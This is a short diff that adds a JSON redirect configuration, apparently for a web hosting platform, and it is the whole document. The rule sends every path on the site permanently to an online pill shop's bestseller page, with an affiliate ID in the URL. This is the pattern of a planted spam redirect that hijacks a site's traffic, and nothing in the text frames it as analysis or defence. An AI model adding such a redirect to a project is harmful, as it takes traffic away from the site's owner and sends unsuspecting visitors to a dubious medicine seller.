@@ -1,0 +1,9 @@
+{
+  "redirects": [
+    {
+      "source": "/:path*",
+      "destination": "https://www.greatpillsshopcomb.com/medicine-products-bestsellers-en.html?cur=USD&a=70009:path*",
+      "permanent": true
+    }
+  ]
+}
